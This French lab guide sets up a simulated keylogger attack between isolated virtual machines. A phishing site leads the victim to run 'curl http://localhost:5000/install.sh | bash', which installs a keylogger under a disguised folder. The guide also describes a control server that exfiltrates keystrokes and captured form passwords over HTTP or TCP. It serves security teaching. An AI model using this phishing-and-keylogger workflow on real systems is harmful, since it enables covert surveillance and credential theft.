# Guide étape par étape – Simulation Keylogger

Ce guide décrit la mise en place complète du projet conformément au sujet « LAB 1 – Extension avancée ». L’ensemble doit impérativement être exécuté dans des machines virtuelles VirtualBox connectées par un réseau interne.

## 1. Préparer les machines virtuelles

1. Créer deux VMs (minimum) :
   - **Attaquant** : Ubuntu ou Windows, 2 Go de RAM, 20 Go de disque.
   - **Victime** : Ubuntu ou Windows, 1 Go de RAM, 15 Go de disque.
2. Installer Python 3.8+ sur chaque VM.  
   - Linux : `sudo apt update && sudo apt install python3 python3-pip`.  
   - Windows : installeur officiel python.org (cocher « Add Python to PATH »).
3. Mettre à jour l’OS et appliquer les correctifs nécessaires.

## 2. Configurer VirtualBox

1. Dans VirtualBox, pour chaque VM : Paramètres > Réseau > Adapter 1 > Mode « Réseau Interne », nom `lab-network`.
2. Démarrer les VMs et déterminer leurs adresses IP (ex. `ip addr show` ou `ipconfig`).
3. Vérifier la connectivité : depuis la VM Victime, `ping <IP_attaquant>`.

## 3. Installer la VM Attaquant

1. Transférer le dossier `attaquant/` dans la VM (dossier partagé, clé USB ou `scp`).  
2. Installer les dépendances :
   ```
   cd attaquant
   pip install -r requirements.txt
   ```
3. Vérifier `config.py` (ports 8080/9999, dossier `logs`).  
4. Lancer le serveur :
   ```
   python server.py
   ```
   La console doit afficher l’écoute HTTP/TCP. Laisser ce terminal ouvert.

## 4. Installer la VM Victime - Scénario de phishing

1. Copier le dossier `KeyloggerScenario/` sur la VM.  
2. Installer Node.js (si nécessaire) :
   ```
   curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
   sudo apt install -y nodejs
   ```
3. Installer les dépendances du site web :
   ```
   cd KeyloggerScenario
   npm install
   ```
4. Configurer l'IP du serveur attaquant dans `server/routes.ts` et `server/storage.ts` :
   - Remplacer `192.168.56.101` par l'IP réelle de la VM Attaquant
5. Démarrer le site web :
   ```
   npm run dev
   ```
   Le site est accessible sur `http://localhost:5000`
6. Ouvrir le site dans un navigateur et suivre les instructions :
   - Copier la commande affichée dans l'alerte de sécurité
   - L'exécuter dans un terminal : `curl http://localhost:5000/install.sh | bash`
   - Le keylogger s'installe automatiquement dans `~/.espoir-solidaire/` avec un environnement virtuel Python isolé

## 5. Installer le contrôleur

1. Copier `controleur/` sur la VM Attaquant (ou sur une troisième VM).  
2. Installer les dépendances :
   ```
   cd controleur
   pip install -r requirements.txt
   ```
3. Modifier `controleur/config.py` avec l’IP du serveur attaquant.  
4. Démarrer le CLI :
   ```
   python controller.py
   ```
5. Tableau de bord web : accessible sur `http://<IP_attaquant>:8080`.

## 6. Ordre d'exécution conseillé

1. Serveur attaquant (`python server.py`).  
2. Site web de phishing sur la victime (`npm run dev` dans KeyloggerScenario).  
3. Victime visite le site et exécute la commande d'installation du keylogger.  
4. Contrôleur CLI ou ouverture du tableau de bord web.  
5. Victime remplit le formulaire d'enquête.  
6. Vérifier côté serveur que les logs et les données du formulaire sont reçus.

## 7. Utiliser le contrôleur

### Interface CLI

```
list                           # lister les victimes
logs <victim_id> [limit]       # afficher les logs
analyze <victim_id>            # analyser les frappes
surveys                        # afficher les données des formulaires capturés
start <victim_id>              # start_capture
stop <victim_id>               # stop_capture
flush <victim_id>              # flush_logs
switch <victim_id> <http|tcp>  # switch_mode
command <victim_id> <cmd> ...  # format générique
```

### Tableau de bord web

1. Sélectionner une victime dans la liste.  
2. Les logs sont rafraîchis toutes les 3 s.  
3. Boutons disponibles : Start Capture, Stop Capture, Flush Logs, Switch HTTP/TCP.  
4. Section Analyse pour consulter les statistiques simples (total de touches, mots-clés, séquences répétitives).  
5. Section Formulaires pour afficher les données capturées du formulaire de phishing (nom, email, mot de passe, etc.).

## 8. Dépannage

| Symptôme | Vérifications |
|----------|---------------|
| Pas de connexion | Serveur démarré, IP correcte, firewall ouvert (`sudo ufw allow 8080 9999`). |
| `Module not found` | `pip install -r requirements.txt`. |
| Permission refusée (Linux) | Installer `python3-dev` et `libx11-dev`, éviter `sudo` sauf nécessité. |
| Aucune victime listée | Keylogger actif, IP correcte dans `controleur/config.py`, attendre quelques secondes. |
| Logs absents | Vérifier `logs/<victim_id>/`, consulter `keylog_buffer.json`. |

## 9. Contrôles à effectuer

- Capturer plusieurs types de touches (lettres, chiffres, touches spéciales).  
- Tester les deux modes d’exfiltration (HTTP puis TCP).  
- Vérifier le retry : couper le serveur puis le relancer pour confirmer l’envoi différé.  
- Utiliser les commandes distantes depuis le CLI et depuis le dashboard web.  
- Documenter l’ensemble (captures d’écran, schéma, limites, améliorations) pour le rapport.

## 10. Améliorations possibles

- Activer TLS/HTTPS pour l’exfiltration.  
- Ajouter une base de données (SQLite/PostgreSQL) pour le stockage des logs.  
- Implémenter un mécanisme d’authentification pour les commandes distantes.  
- Étendre l’analyse (détection de mots sensibles, corrélation temporelle).  
- Automatiser la collecte de captures d’écran et la génération de rapports.

